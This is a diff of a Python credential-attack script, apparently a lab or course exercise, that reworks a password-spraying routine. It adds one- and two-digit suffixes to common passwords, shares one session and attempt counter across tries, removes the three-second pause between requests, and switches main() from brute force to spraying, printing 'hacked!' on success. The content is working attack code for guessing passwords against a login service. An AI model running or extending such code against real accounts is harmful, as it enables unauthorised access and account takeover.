@@ -81,7 +81,7 @@ def brute_force(username):
         if answer == 200:
             return 1 
 
-        if password.isalpha():
+        if not password.isdigit():
             #check password with suffix
             for length in [1, 2]:
                 for i in range(10**length):
@@ -94,15 +94,11 @@ def brute_force(username):
                         return 1    
     return 0
 
-def password_sparying(password):
-    #repeated code need to fix
-    start_time = time.time()  
+def password_sparying(password, session, start_time,attempt_count):
     max_attempts = 1000000    
     max_seconds = 2 * 3600   # 2 hours in secs
-    attempt_count = 0
-    session = requests.Session()
 
-    for i in range(1,31):
+    for i in range(11,21):
         #check attempts limit
         if attempt_count >= max_attempts:
             print("Reached maximum attempts limit.")
@@ -119,8 +115,8 @@ def password_sparying(password):
         attempt_count += 1 
 
         if answer == 200:
-            return 1
-    return 0
+            return (1, attempt_count)
+    return (0, attempt_count)
 
 def start_brute_force():
     #need to choose randomly from each category?
@@ -134,17 +130,40 @@ def start_brute_force():
 
 
 def start_password_spraying():
+    #repeated code need to fix
+    start_time = time.time()  
+    attempt_count = 0
+    session = requests.Session()
     common_passwords = load_common_password()
+
     for password in common_passwords:
         password = password[:-1]
         try:
-            if password_sparying(password):
+            result = password_sparying(password, session, start_time, attempt_count)
+            if result[0]:
                 print("hacked!")
                 break
+            else:
+                attempt_count = result[1]
+            
+            if not password.isdigit():
+            #check password with suffix
+                for length in [1, 2]:
+                    for i in range(10**length):
+                        suffix = f"{i:0{length}}"
+                        current_password = password + suffix
+                        result = password_sparying(current_password, session, start_time, attempt_count)
+                        if result[0]:
+                            break
+                        else:
+                            attempt_count = result[1]
+                            
         except:
             print('error in sending info to the server')
-        finally:
-            time.sleep(3)
+            break
+           
+
+
 
 
 
@@ -152,8 +171,8 @@ def start_password_spraying():
 
 
 def main():
-    #start_password_spraying()
-    start_brute_force()
+    start_password_spraying()
+    #start_brute_force()
 
     
     
